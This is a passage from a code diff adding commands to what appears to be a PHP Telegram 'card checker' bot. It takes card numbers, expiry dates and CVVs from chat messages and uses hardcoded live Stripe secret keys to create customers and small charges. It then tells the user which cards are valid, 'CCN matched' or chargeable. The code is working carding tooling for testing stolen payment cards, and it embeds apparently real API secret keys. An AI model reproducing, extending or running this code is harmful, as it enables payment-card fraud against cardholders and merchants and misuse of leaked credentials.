+            return;
+          }
+          if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, ' "message": "testmode_charges_only"'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'transaction_not_allowed'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Your card does not support this type of purchase. </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'invalid_number'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» NO ACCOUNT ❌</b>%0A<b>Response -» invalid_number </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+
+
+        else {
+          sendMessage($chatId, "<b>SERVER ERROR</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
+          sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
+          sendLog($chatId, "<b>BUG REPORTED /chg</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
+          }
+        }
+///////////========[scg Command]=========//////////
+elseif (strpos($message, "/scg") === 0){
+  $skeys = array(
+      1 => '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', // Enter at least one sk key
+    //2 => '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',-----------------|
+    //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
+    //4 => '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',                 |
+    //5 => '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',-----------------|
+    ); 
+    $skey = array_rand($skeys);
+    $sk = $skeys[$skey];
+    $message = substr($message, 4);
+    $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
+    $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
+    $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
+    $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
+    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
+        $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'Host: lookup.binlist.net',
+        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+        $fim = curl_exec($ch);
+        $bank = GetStr($fim, '"bank":{"name":"', '"');
+        $name = GetStr($fim, '"name":"', '"');
+        $brand = GetStr($fim, '"brand":"', '"');
+        $country = GetStr($fim, '"country":{"name":"', '"');
+        $emoji = GetStr($fim, '"emoji":"', '"');
+        $scheme = GetStr($fim, '"scheme":"', '"');
+        $type = GetStr($fim, '"type":"', '"');
+        if(strpos($fim, '"type":"credit"') !== false){
+        $bin = 'Credit';
+        }else{
+        $bin = 'Debit';
+        };
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
+        $result1 = curl_exec($ch);
+        $tok1 = Getstr($result1,'"id": "','"');
+        $msg1 = Getstr($result1,'"message": "','"');
+        if(strpos($result1, "card_error")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "card_declined")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "rate_limit")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "invalid_cvc")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "sources_required_type_param")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "testmode_charges_only")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'invalid_expiry_year'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» EXPRIED CARD ❌</b>%0A<b>Response -» invalid_expiry_year </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'invalid_expiry_month'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» EXPRIED CARD ❌</b>%0A<b>Response -» invalid_expiry_month </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'incorrect_number'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» INVALID CARD ❌</b>%0A<b>Response -» Incorrect number </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
+        $result2 = curl_exec($ch);
+        $tok2 = Getstr($result2,'"id": "','"');
+        $msg2 = Getstr($result2,'"message": "','"');
+        if(strpos($result2, "card_error")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "invalid_cvc")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "sources_required_type_param")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1000&currency=inr&customer='.$tok2.'');
+        $result3 = curl_exec($ch);
+        $msg3 = Getstr($result3,'"message": "','"');
+        $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
+        $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
+        $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
+        if(strpos($result3, '"status": "succeeded"' )) {
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 0.1$ ✅</b>%0A<b>Response -» CHARGED 0.1$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        sendLog ($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 0.1$ ✅</b>%0A<b>Response -» CHARGED 0.1$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        return;
+        }
+        if(strpos($result3, "insufficient_funds" )) {
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, "card_error_Chargeentication_required")) || (strpos($result2, "card_error_Chargeentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        }
+        if(strpos($result3,"Your card's security code is incorrect.")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, "fraudulent"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, "expired_card"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, '"decline_code": "generic_decline"'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+            }
+          if ((strpos($result3, "do_not_honor"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'rate_limit'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+            
+          if ((strpos($result3, "Your card was declined."))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, ' "message": "testmode_charges_only"'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'transaction_not_allowed'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Your card does not support this type of purchase. </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'invalid_number'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» NO ACCOUNT ❌</b>%0A<b>Response -» invalid_number </b>%0A<b>Gateway -» Stripe Charge 0.1$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+
+
+        else {
+          sendMessage($chatId, "<b>SERVER ERROR</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
+          sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
+          sendLog($chatId, "<b>BUG REPORTED /chg</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
+          }
+        }
     //////////=========[agt Command]=========//////////
     elseif (strpos($message, "/agt") === 0){
       $skeys = array(
